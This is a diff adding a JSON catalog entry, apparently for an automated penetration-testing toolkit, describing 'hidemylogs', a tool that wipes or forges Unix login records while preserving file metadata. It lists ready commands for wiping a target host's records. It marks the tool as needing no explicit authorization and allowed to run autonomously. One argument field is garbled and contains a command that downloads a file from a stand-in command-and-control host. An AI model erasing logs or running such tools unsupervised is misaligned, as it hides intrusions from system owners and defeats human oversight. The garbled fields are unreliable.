@@ -1,0 +1,253 @@
+{
+  "id": "github:franckferman/hidemylogs",
+  "kind": "external_repository",
+  "name": "hidemylogs",
+  "full_name": "franckferman/hidemylogs",
+  "owner": "franckferman",
+  "category": "Penetration Testing",
+  "url": "https://github.com/franckferman/hidemylogs",
+  "summary": "**Surgical \\*nix log cleaner** - selectively erase access records from lastlog, wtmp, btmp, and utmp while preserving file metadata.",
+  "documentation": {
+    "readme": "Surgical \\nix log cleaner - selectively erase access records from lastlog, wtmp, btmp, and utmp while preserving file metadata.",
+    "usage_sections": [
+      "print - Read and display records from utmp, wtmp, btmp, and lastlog",
+      "wipe - Remove records matching a username, IP, or time range filter",
+      "forge - Overwrite a lastlog record with a fake timestamp, terminal, and host",
+      "Remote log forwarding (rsyslog, syslog-ng) is the only reliable defense",
+      "File integrity monitoring (AIDE, Tripwire) detects modifications to log files"
+    ],
+    "arguments": [
+      {
+        "name": "-a",
+        "description": "Filter by IP/hostname",
+        "source": "docs"
+      },
+      {
+        "name": "--address",
+        "description": "Filter by IP/hostname",
+        "source": "docs"
+      },
+      {
+        "name": "--and",
+        "description": "All filters must match (default: any matches)",
+        "source": "docs"
+      },
+      {
+        "name": "-b",
+        "description": "btmp file [default: /var/log/btmp]",
+        "source": "docs"
+      },
+      {
+        "name": "-backup",
+        "description": "TTY=pts/6 ; PWD=/tmp ; USER=root ; COMMAND=/usr/bin/curl -o /tmp/.x https://c2.example.com/beacon\",",
+        "source": "docs"
+      },
+      {
+        "name": "--btmp",
+        "description": "btmp file [default: /var/log/btmp]",
+        "source": "docs"
+      },
+      {
+        "name": "--dry-run",
+        "description": "Preview without modifying files",
+        "source": "docs"
+      },
+      {
+        "name": "--host",
+        "description": "Fake hostname/IP [default: \"\"]",
+        "source": "docs"
+      },
+      {
+        "name": "-l",
+        "description": "lastlog file [default: /var/log/lastlog]",
+        "source": "docs"
+      },
+      {
+        "name": "--lastlog",
+        "description": "lastlog file [default: /var/log/lastlog]",
+        "source": "docs"
+      },
+      {
+        "name": "--line",
+        "description": "Fake terminal [default: pts/0]",
+        "source": "docs"
+      },
+      {
+        "name": "-n",
+        "description": "Filter by username",
+        "source": "docs"
+      },
+      {
+        "name": "--name",
+        "description": "Filter by username",
+        "source": "docs"
+      },
+      {
+        "name": "-s",
+        "description": "Sources to display: u/w/b/l or any combination [default: uwbl]",
+        "source": "docs"
+      },
+      {
+        "name": "--sources",
+        "description": "Sources to display: u/w/b/l or any combination [default: uwbl]",
+        "source": "docs"
+      },
+      {
+        "name": "-t",
+        "description": "Filter by time range (HH:MM-HH:MM)",
+        "source": "docs"
+      },
+      {
+        "name": "--time",
+        "description": "Filter by time range (HH:MM-HH:MM)",
+        "source": "docs"
+      },
+      {
+        "name": "-u",
+        "description": "utmp file [default: /var/run/utmp]",
+        "source": "docs"
+      },
+      {
+        "name": "--uid",
+        "description": "Target UID",
+        "source": "docs"
+      },
+      {
+        "name": "--utmp",
+        "description": "utmp file [default: /var/run/utmp]",
+        "source": "docs"
+      },
+      {
+        "name": "-w",
+        "description": "wtmp file [default: /var/log/wtmp]",
+        "source": "docs"
+      },
+      {
+        "name": "--wtmp",
+        "description": "wtmp file [default: /var/log/wtmp]",
+        "source": "docs"
+      }
+    ],
+    "function_signatures": [
+      {
+        "name": "main",
+        "signature": "main(-a, --address, --and, -backup, --btmp, --dry-run)",
+        "file": "README",
+        "language": "cli",
+        "description": "CLI entrypoint for hidemylogs",
+        "source": "local_readme"
+      }
+    ],
+    "examples": [
+      "cargo build --release",
+      "python3 scripts/generate_samples.py",
+      "./hidemylogs print \\",
+      "./hidemylogs wipe \\",
+      "sudo ./hidemylogs print",
+      "sudo ./hidemylogs print -s wl",
+      "sudo ./hidemylogs print -s b",
+      "./hidemylogs print -w /path/to/wtmp -l /path/to/lastlog -s wl",
+      "sudo ./hidemylogs wipe -a $KFIOSA_TARGET_HOST --dry-run",
+      "sudo ./hidemylogs wipe -a $KFIOSA_TARGET_HOST"
+    ],
+    "file_listing": [
+      "Cargo.toml",
+      "LICENSE",
+      "Makefile",
+      "README.md",
+      "TODO.md",
+      "ci.yml",
+      "compromised.auth.log",
+      "compromised.btmp",
+      "compromised.lastlog",
+      "compromised.utmp",
+      "compromised.wtmp",
+      "display.rs",
+      "generate_samples.py",
+      "index.html",
+      "lastlog.rs",
+      "main.rs",
+      "polymorphic.py",
+      "release.yml",
+      "static.yml",
+      "utmp.rs"
+    ],
+    "languages": [
+      "python"
+    ],
+    "how_to_use": "Install/setup: git clone https://github.com/franckferman/hidemylogs.git. Run the primary entrypoint as shown in upstream docs, e.g. `cargo build --release`. Further invocations from upstream: `python3 scripts/generate_samples.py`; `./hidemylogs print \\`. Surgical \\nix log cleaner - selectively erase access records from lastlog, wtmp, btmp, and utmp while preserving file metadata.",
+    "when_to_use": "Use during the 'any' phase against surfaces [shell_linux] in the Penetration Testing category. Fits when the engagement needs: **Surgical \\*nix log cleaner** - selectively erase access records from lastlog, wtmp, btmp, and utmp while preserving file metadata.",
+    "why_to_use": "Prefer this tool based on upstream description: Surgical \\nix log cleaner - selectively erase access records from lastlog, wtmp, btmp, and utmp while preserving file metadata."
+  },
+  "metadata_status": "enriched",
+  "trust": {
+    "official_kali": false,
+    "reviewed": false,
+    "warning": "Attribution/index entry only. Audit provenance, code, releases and licence before use."
+  },
+  "risk": {
+    "level": "high",
+    "signals": [
+      "intrinsic",
+      "lab_only",
+      "polymorphic_compatible",
+      "target_adaptive_compatible"
+    ],
+    "requires_explicit_authorization": false,
+    "allow_autonomous_execution": true,
+    "examples_policy": "operational"
+  },
+  "tags": [
+    "penetration_testing",
+    "toolbox",
+    "github",
+    "franckferman",
+    "lang:python",
+    "lab_only",
+    "polymorphic",
+    "target-adaptive"
+  ],
+  "use_cases": [
+    "When you need Penetration Testing, use hidemylogs because **Surgical \\*nix log cleaner** - selectively erase access records from lastlog, wtmp, btmp, and utmp while preserving file metadata.",
+    "When you need a concrete invocation, run `cargo build --release` as documented upstream for hidemylogs.",
+    "When you need a concrete invocation, run `python3 scripts/generate_samples.py` as documented upstream for hidemylogs.",
+    "When you need a concrete invocation, run `./hidemylogs print \\` as documented upstream for hidemylogs.",
+    "When you need a concrete invocation, run `./hidemylogs wipe \\` as documented upstream for hidemylogs.",
+    "When chaining Penetration Testing tools, pair hidemylogs with sibling catalog entries sharing its attack_surface/phase_hint.",
+    "When validating lab setup, run `hidemylogs --help` (or the README entrypoint) and confirm required hardware/deps from the catalog."
+  ],
+  "command_examples": [
+    "cargo build --release",
+    "python3 scripts/generate_samples.py",
+    "./hidemylogs print \\",
+    "./hidemylogs wipe \\",
+    "sudo ./hidemylogs print",
+    "sudo ./hidemylogs print -s wl",
+    "sudo ./hidemylogs print -s b",
+    "./hidemylogs print -w /path/to/wtmp -l /path/to/lastlog -s wl",
+    "sudo ./hidemylogs wipe -a $KFIOSA_TARGET_HOST --dry-run",
+    "sudo ./hidemylogs wipe -a $KFIOSA_TARGET_HOST"
+  ],
+  "attack_surface": [
+    "shell_linux"
+  ],
+  "phase_hint": "any",
+  "requires_hardware": [
+    "none"
+  ],
+  "polymorphic_strategies": [
+    "param_grammar",
+    "tool_variant_picker"
+  ],
+  "target_adaptive_targets": [
+    "target_class",
+    "vendor"
+  ],
+  "_kfiosa_enriched_schema": "1.1.0",
+  "_kfiosa_enriched_at": "phase_2_4_plus",
+  "_languages": [
+    "python"
+  ],
+  "_kfiosa_enhanced_v3": true,
+  "_enhanced_via": "local_readme"
+}
